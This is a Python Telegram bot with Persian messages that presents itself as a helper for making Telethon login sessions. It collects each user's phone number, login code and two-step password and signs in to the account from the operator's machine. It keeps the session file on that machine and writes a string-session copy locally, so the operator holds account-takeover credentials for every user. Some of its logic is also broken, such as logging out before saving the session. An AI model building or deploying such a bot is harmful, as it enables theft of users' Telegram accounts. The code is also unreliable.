import os
import asyncio
import re
import sys

from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
)

# ==============================
# Telegram API
# ==============================

API_ID = 34855392
API_HASH = "YOUR_API_HASH"
BOT_TOKEN = "YOUR_BOT_TOKEN"

# ==============================
# Device Settings
# ==============================

DEVICE_MODEL = "Windows 11"
SYSTEM_VERSION = "Windows 11"
APP_VERSION = "Telegram Desktop"
LANG_CODE = "en"
SYSTEM_LANG_CODE = "en-US"

PROXY = None

# ==============================
# Temporary Storage
# ==============================

user_sessions = {}
user_data = {}

# ==============================
# Helper Functions
# ==============================

def is_valid_session_name(name):
    if not name:
        return False
    return bool(re.match(r'^[\w\-]+$', name))

async def create_telegram_client(session_path, session_name):
    return TelegramClient(
        session_path,
        API_ID,
        API_HASH,
        device_model=DEVICE_MODEL,
        system_version=SYSTEM_VERSION,
        app_version=APP_VERSION,
        lang_code=LANG_CODE,
        system_lang_code=SYSTEM_LANG_CODE,
        proxy=PROXY
    )

async def send_code_to_user(user_id, phone, client):
    try:
        await client.send_code_request(phone)
        user_sessions[user_id] = {
            "step": "waiting_code",
            "phone": phone,
            "client": client
        }
        return True, "✅ کد تایید به تلگرام شما ارسال شد. لطفاً کد را وارد کنید:"
    except Exception as e:
        return False, f"❌ خطا در ارسال کد: {str(e)}"

async def complete_login(user_id, code=None, password=None):
    if user_id not in user_sessions:
        return False, "❌ جلسه شما منقضی شده است. لطفاً دوباره شروع کنید."

    user_info = user_sessions[user_id]
    client = user_info.get("client")
    
    if not client:
        return False, "❌ خطا در ارتباط با کلاینت"

    try:
        if password:
            await client.sign_in(password=password)
        else:
            await client.sign_in(phone=user_info["phone"], code=code)
        
        return True, "✅ ورود با موفقیت انجام شد!"
    except SessionPasswordNeededError:
        return "password_needed", "🔐 تایید دو مرحله‌ای فعال است. لطفاً رمز عبور را وارد کنید:"
    except PhoneCodeInvalidError:
        return False, "❌ کد وارد شده نامعتبر است. دوباره تلاش کنید:"
    except PhoneCodeExpiredError:
        return False, "❌ کد منقضی شده است. دوباره تلاش کنید:"
    except Exception as e:
        return False, f"❌ خطا: {str(e)}"

async def save_session_and_send(user_id, client, session_name):
    try:
        sessions_dir = os.path.expanduser("~/sessions")
        os.makedirs(sessions_dir, exist_ok=True)

        session_path = os.path.join(sessions_dir, session_name)
        session_file = session_path + ".session"

        await client.log_out()
        await client.connect()
        
        string_session = StringSession.save(client.session)
        
        if not string_session:
            return False, "❌ ایجاد String Session ناموفق بود"

        string_filename = f"{session_name}_string.txt"
        with open(string_filename, "w", encoding="utf-8") as f:
            f.write(string_session)

        await client.start(phone=user_sessions[user_id].get("phone"))
        
        if os.path.isfile(session_file):
            await client.send_file(
                "me",
                session_file,
                caption=f"📁 Telegram Session\nName: {session_name}"
            )
        
        await client.send_file(
            "me",
            string_filename,
            caption=f"🔐 Telegram String Session\nName: {session_name}"
        )

        return True, "✅ فایل‌های سشن با موفقیت به Saved Messages ارسال شدند"
    
    except Exception as e:
        return False, f"❌ خطا در ذخیره‌سازی: {str(e)}"

# ==============================
# Bot Class
# ==============================

class SessionBot:
    def __init__(self):
        self.bot = None
        self.is_running = False
    
    async def start(self):
        """Start the bot with proper event loop management"""
        # Create bot client inside the same event loop
        self.bot = TelegramClient("bot_session", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
        
        # Register handlers
        self.register_handlers()
        
        # Start the bot
        await self.bot.start()
        self.is_running = True
        print("✅ Bot started successfully!")
        print("Press Ctrl+C to stop")
        
        # Keep the bot running
        await self.bot.run_until_disconnected()
    
    def register_handlers(self):
        """Register all event handlers"""
        @self.bot.on(events.NewMessage(pattern="/start"))
        async def start_command(event):
            user_id = event.sender_id
            
            if user_id in user_sessions:
                del user_sessions[user_id]
            if user_id in user_data:
                del user_data[user_id]
            
            await event.reply(
                "🤖 **ربات سازنده سشن تلگرام**\n\n"
                "این ربات به شما کمک می‌کند تا سشن تلگرام خود را بسازید.\n\n"
                "📌 **مراحل:**\n"
                "1️⃣ نام سشن خود را وارد کنید\n"
                "2️⃣ شماره تلفن خود را وارد کنید\n"
                "3️⃣ کد تایید دریافتی را وارد کنید\n"
                "4️⃣ اگر تایید دو مرحله‌ای دارید، رمز عبور را وارد کنید\n\n"
                "✅ فایل‌های سشن به Saved Messages شما ارسال می‌شوند.\n\n"
                "لطفاً نام سشن خود را وارد کنید:",
                parse_mode="markdown"
            )
            
            user_sessions[user_id] = {"step": "waiting_name"}
        
        @self.bot.on(events.NewMessage(pattern="/cancel"))
        async def cancel_command(event):
            user_id = event.sender_id
            
            if user_id in user_sessions:
                if "client" in user_sessions[user_id]:
                    try:
                        await user_sessions[user_id]["client"].disconnect()
                    except:
                        pass
                del user_sessions[user_id]
            
            if user_id in user_data:
                del user_data[user_id]
            
            await event.reply("✅ عملیات کنسل شد. برای شروع مجدد از /start استفاده کنید.")
        
        @self.bot.on(events.NewMessage)
        async def handle_messages(event):
            if event.is_private:
                user_id = event.sender_id
                text = event.raw_text.strip()
                
                if user_id not in user_sessions:
                    await event.reply("لطفاً ابتدا با دستور /start شروع کنید.")
                    return
                
                step = user_sessions[user_id].get("step")
                
                if step == "waiting_name":
                    if not is_valid_session_name(text):
                        await event.reply(
                            "❌ نام سشن نامعتبر است.\n"
                            "لطفاً فقط از حروف انگلیسی، اعداد، خط تیره و زیرخط استفاده کنید.\n"
                            "مثال: my_session_01"
                        )
                        return
                    
                    user_sessions[user_id]["session_name"] = text
                    user_sessions[user_id]["step"] = "waiting_phone"
                    
                    await event.reply(
                        f"✅ نام سشن: `{text}`\n\n"
                        "📱 لطفاً شماره تلفن خود را با کد کشور وارد کنید:\n"
                        "مثال: `+989123456789`",
                        parse_mode="markdown"
                    )
                
                elif step == "waiting_phone":
                    phone = re.sub(r'[^0-9+]', '', text)
                    if not phone or len(phone) < 10:
                        await event.reply(
                            "❌ شماره تلفن نامعتبر است.\n"
                            "لطفاً شماره را با کد کشور وارد کنید.\n"
                            "مثال: `+989123456789`",
                            parse_mode="markdown"
                        )
                        return
                    
                    user_sessions[user_id]["phone"] = phone
                    session_name = user_sessions[user_id]["session_name"]
                    
                    sessions_dir = os.path.expanduser("~/sessions")
                    os.makedirs(sessions_dir, exist_ok=True)
                    
                    session_path = os.path.join(sessions_dir, session_name)
                    
                    client = await create_telegram_client(session_path, session_name)
                    
                    await event.reply("🔄 در حال اتصال به تلگرام...")
                    
                    try:
                        await client.connect()
                        user_sessions[user_id]["client"] = client
                        
                        success, message = await send_code_to_user(user_id, phone, client)
                        await event.reply(message)
                        
                        if not success:
                            user_sessions[user_id]["step"] = "waiting_phone"
                            
                    except Exception as e:
                        await event.reply(f"❌ خطا در اتصال: {str(e)}")
                        user_sessions[user_id]["step"] = "waiting_phone"
                
                elif step == "waiting_code":
                    result = await complete_login(user_id, code=text)
                    
                    if result[0] == "password_needed":
                        user_sessions[user_id]["step"] = "waiting_password"
                        await event.reply(result[1])
                    
                    elif result[0] is True:
                        await event.reply("✅ ورود با موفقیت انجام شد!\n🔄 در حال ایجاد سشن...")
                        
                        session_name = user_sessions[user_id]["session_name"]
                        client = user_sessions[user_id]["client"]
                        
                        success, message = await save_session_and_send(user_id, client, session_name)
                        await event.reply(message)
                        
                        if user_id in user_sessions:
                            del user_sessions[user_id]
                        
                        await event.reply(
                            "✅ **فرآیند ساخت سشن کامل شد!**\n\n"
                            "📁 فایل‌های سشن به Saved Messages شما ارسال شدند.\n"
                            "🔐 برای امنیت بیشتر، فایل‌ها را در جای امن نگهداری کنید.\n\n"
                            "برای ساخت سشن جدید از /start استفاده کنید.",
                            parse_mode="markdown"
                        )
                    
                    else:
                        await event.reply(result[1])
                
                elif step == "waiting_password":
                    result = await complete_login(user_id, password=text)
                    
                    if result[0] is True:
                        await event.reply("✅ ورود با موفقیت انجام شد!\n🔄 در حال ایجاد سشن...")
                        
                        session_name = user_sessions[user_id]["session_name"]
                        client = user_sessions[user_id]["client"]
                        
                        success, message = await save_session_and_send(user_id, client, session_name)
                        await event.reply(message)
                        
                        if user_id in user_sessions:
                            del user_sessions[user_id]
                        
                        await event.reply(
                            "✅ **فرآیند ساخت سشن کامل شد!**\n\n"
                            "📁 فایل‌های سشن به Saved Messages شما ارسال شدند.\n"
                            "🔐 برای امنیت بیشتر، فایل‌ها را در جای امن نگهداری کنید.\n\n"
                            "برای ساخت سشن جدید از /start استفاده کنید.",
                            parse_mode="markdown"
                        )
                    
                    else:
                        await event.reply(result[1])
    
    async def stop(self):
        """Properly stop the bot and clean up"""
        if self.bot and self.is_running:
            try:
                await self.bot.disconnect()
                self.is_running = False
                print("✅ Bot disconnected successfully")
            except Exception as e:
                print(f"⚠️ Error during disconnect: {e}")

# ==============================
# Main
# ==============================

async def main():
    """Main entry point with proper event loop management"""
    print("=" * 50)
    print("       TELEGRAM SESSION MAKER BOT")
    print("=" * 50)
    print("Starting bot...")
    
    bot = SessionBot()
    
    try:
        await bot.start()
    except KeyboardInterrupt:
        print("\n⚠️ Bot stopped by user")
    except Exception as e:
        print(f"❌ Fatal error: {e}")
        return 1
    finally:
        await bot.stop()
    
    return 0

def run():
    """Entry point for the script"""
    try:
        # Use asyncio.run() only once for the entire application
        exit_code = asyncio.run(main())
        sys.exit(exit_code)
    except KeyboardInterrupt:
        print("\n⚠️ Application stopped")
        sys.exit(0)
    except Exception as e:
        print(f"❌ Critical error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    run()
